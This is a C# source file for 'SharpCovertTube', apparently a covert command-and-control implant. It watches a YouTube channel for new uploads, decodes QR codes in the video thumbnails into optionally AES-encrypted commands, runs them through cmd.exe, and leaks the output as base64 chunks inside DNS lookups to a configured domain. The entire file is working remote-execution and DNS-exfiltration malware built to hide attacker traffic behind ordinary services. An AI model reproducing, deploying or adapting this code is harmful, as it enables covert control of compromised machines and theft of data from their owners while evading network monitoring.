using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Text;
using System.Drawing;
using System.Diagnostics;
using System.Collections.Generic;
using SharpCovertTube.QRCodeDecoder;
using System.Security.Cryptography;


namespace SharpCovertTube
{
    internal class Program
    {
        // FILL VALUES
        public const string channel_id = "";
        public const string api_key = "";
        public const string payload_aes_key = "0000000000000000";
        public const string payload_aes_iv = "0000000000000000";
        public const string dns_hostname = ".test.org";
        public const int seconds_delay = 60;


        static string ByteArrayToStr(byte[] DataArray)
        {
            Decoder decoder = Encoding.UTF8.GetDecoder();
            int CharCount = decoder.GetCharCount(DataArray, 0, DataArray.Length);
            char[] CharArray = new char[CharCount];
            decoder.GetChars(DataArray, 0, DataArray.Length, CharArray, 0);
            return new string(CharArray);
        }


        // Source: https://github.com/Stefangansevles/QR-Capture
        static string DecodeQR(Bitmap QRCodeInputImage)
        {
            QRDecoder decoder = new QRDecoder();
            byte[][] DataByteArray = decoder.ImageDecoder(QRCodeInputImage);
            if (DataByteArray == null)
            {
                Console.WriteLine("DataByteArray is null");
                return "";
            }
            string code = ByteArrayToStr(DataByteArray[0]);
            return code;
        }
        

        static string ReadQR(string thumbnail_url)
        {
            Console.WriteLine("[+] Request to {0}", thumbnail_url);
            var client = new WebClient();
            var stream = client.OpenRead(thumbnail_url);
            if (stream == null) return "";
            Bitmap bitmap_from_image = new Bitmap(stream);
            Console.WriteLine("[+] Reading QR from {0}", thumbnail_url);
            string decoded_cmd = DecodeQR(bitmap_from_image);
            return decoded_cmd;
        }


        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }


        public static string Base64Decode(string base64EncodedData)
        {
            var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
            return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
        }


        // Source: MSDN
        static string ExecuteCommand(string command)
        {
            string output = "";
            using (Process process = new Process())
            {
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                StreamReader reader2 = process.StandardOutput;
                output = reader2.ReadToEnd();
                process.WaitForExit();
            }
            return output;
        }


        // Source: https://stackoverflow.com/questions/4133377/splitting-a-string-number-every-nth-character-number
        static IEnumerable<String> SplitInParts(String s, Int32 partLength)
        {
            if (s == null)
            {
                throw new ArgumentNullException(nameof(s));
            }
            if (partLength <= 0)
            {
                throw new ArgumentException("Part length has to be positive.", nameof(partLength));
            }
            for (var i = 0; i < s.Length; i += partLength)
                yield return s.Substring(i, Math.Min(partLength, s.Length - i));
        }


        static void DNSExfil(string response_cmd) {
            // Base64-encode the response
            if (response_cmd == "")
            {
                response_cmd = "null";
            }
            string base64_response_cmd = Base64Encode(response_cmd);
            Console.WriteLine("[+] Base64-encoded response:\t\t{0}", base64_response_cmd);
            int max_size = 50; // 255 - dns_hostname.Length - 1; <-- These sizes generate errors and I dont know why
            if (base64_response_cmd.Length > max_size) {
                Console.WriteLine("[+] Splitting encoded response in chunks of {0} characters", max_size);
            }
            var parts = SplitInParts(base64_response_cmd, max_size);
            foreach (var response_portion in parts)
            {
                // DNS lookup
                try
                {
                    string exfil_hostname = response_portion + dns_hostname;
                    exfil_hostname = exfil_hostname.Replace("=", "");
                    Console.WriteLine("[+] DNS lookup against:\t\t{0}", exfil_hostname);
                    Dns.GetHostAddresses(exfil_hostname);
                }
                catch (Exception e)
                {
                    if (e.GetType().ToString() != "System.Net.Sockets.SocketException")
                    {
                        Console.WriteLine("[-] Exception: {0}", e.ToString());
                    }
                }
            }
        }


        static string TryDecrypt(string payload)
        {
            try {
                // Base64-decode
                string base64_decoded = Base64Decode(payload);
                Console.WriteLine("[+] Base64-decoded:\t{0}", base64_decoded);

                string decrypted_cmd = DecryptStringFromBytes(base64_decoded, Encoding.ASCII.GetBytes(payload_aes_key), Encoding.ASCII.GetBytes(payload_aes_iv));
                Console.WriteLine("[+] Payload was AES-encrypted");
                return decrypted_cmd;
            }
            catch {
                Console.WriteLine("[+] Payload was not AES-encrypted");
                return payload;
            }
        }


        static void ReadVideo(string video_id, string channel_url)
        {
            Console.WriteLine("[+] Reading video with ID {0}", video_id);
            string thumbnail_url = "https://i.ytimg.com/vi/" + video_id + "/hqdefault.jpg";
            
            // Read QR
            string qr_decoded_cmd = ReadQR(thumbnail_url);
            Console.WriteLine("[+] Value decoded from QR:\t{0}", qr_decoded_cmd);

            // Decrypt in case it is AES-encrypted
            string decrypted_cmd = TryDecrypt(qr_decoded_cmd); 
            Console.WriteLine("[+] After trying to AES-decrypt:\t{0}", decrypted_cmd);

            // Execute command
            string response_cmd = ExecuteCommand(decrypted_cmd);
            response_cmd.Trim();
            Console.WriteLine("[+] Response from command:\t{0}", response_cmd);

            // Exfiltrate
            DNSExfil(response_cmd);
        }


        static string getRequest(string url) {
            WebRequest wrGETURL = WebRequest.Create(url);
            Stream objStream = wrGETURL.GetResponse().GetResponseStream();
            StreamReader objReader = new StreamReader(objStream);
            string json_response_str = "";
            string sLine = "";
            while (sLine != null)
            {
                json_response_str += sLine;
                sLine = objReader.ReadLine();
            }
            return json_response_str;
        }


        static List<string> GetVideoIds(string channel_url)
        {
            List<string> VideoIds = new List<string>();
            string json_response_str = getRequest(channel_url);

            var deserialized = JSONSerializer<APIInfo>.DeSerialize(json_response_str);
            foreach (Item item in deserialized.items)
            {
                VideoIds.Add(item.id.videoId);
            }

            return VideoIds;
        }


        static void MonitorChannel(string channel_url, int seconds_delay) {
            // Initial videos
            List<string> Initial_VideoIds = GetVideoIds(channel_url);
            int number_of_videos = Initial_VideoIds.Count;
            foreach (string value in Initial_VideoIds)
            {
                Console.WriteLine("[+] Video already uploaded with ID: \t{0}", value);
            }

            while (true)
            {
                // Sleep
                Console.WriteLine("[+] Sleeping {0} seconds \n", seconds_delay);
                System.Threading.Thread.Sleep(1000 * seconds_delay);

                // Get list of videos
                List<string> VideoIds = GetVideoIds(channel_url);
                // If new videos -> Read
                if (VideoIds.Count > number_of_videos)
                {
                    Console.WriteLine("[+] New videos uploaded!");

                    var firstNotSecond = VideoIds.Except(Initial_VideoIds);
                    foreach (var video_id in firstNotSecond)
                    {
                        Console.WriteLine("[+] New ID: \t{0}", video_id);
                        ReadVideo(video_id, channel_url);
                    }

                    number_of_videos = VideoIds.Count;
                    Initial_VideoIds = VideoIds;
                }
                // No new videos
                else
                {
                    Console.WriteLine("[+] No new videos... Total: {0}", VideoIds.Count);
                }
            }
        }

    
        // AES Decrypt
        static string DecryptStringFromBytes(String cipherTextEncoded, byte[] Key, byte[] IV)
        {
            byte[] cipherText = Convert.FromBase64String(cipherTextEncoded);
            if (cipherText == null || cipherText.Length <= 0)
                throw new ArgumentNullException("cipherText");
            if (Key == null || Key.Length <= 0)
                throw new ArgumentNullException("Key");
            if (IV == null || IV.Length <= 0)
                throw new ArgumentNullException("IV");
            string plaintext = null;
            using (RijndaelManaged rijAlg = new RijndaelManaged())
            {
                rijAlg.Key = Key;
                rijAlg.IV = IV;
                ICryptoTransform decryptor = rijAlg.CreateDecryptor(rijAlg.Key, rijAlg.IV);
                using (MemoryStream msDecrypt = new MemoryStream(cipherText))
                {
                    using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                    {
                        using (StreamReader srDecrypt = new StreamReader(csDecrypt))
                        {
                            plaintext = srDecrypt.ReadToEnd();
                        }
                    }
                }
            }
            return plaintext;
        }


        static void Main(string[] args)
        {
            string channel_url = "https://www.googleapis.com/youtube/v3/search?" + "part=snippet&channelId=" + channel_id + "&maxResults=100&order=date&type=video&key=" + api_key;
            Console.WriteLine("[+] URL to test for file upload: {0}", channel_url);
            MonitorChannel(channel_url, seconds_delay);
        }
    }
}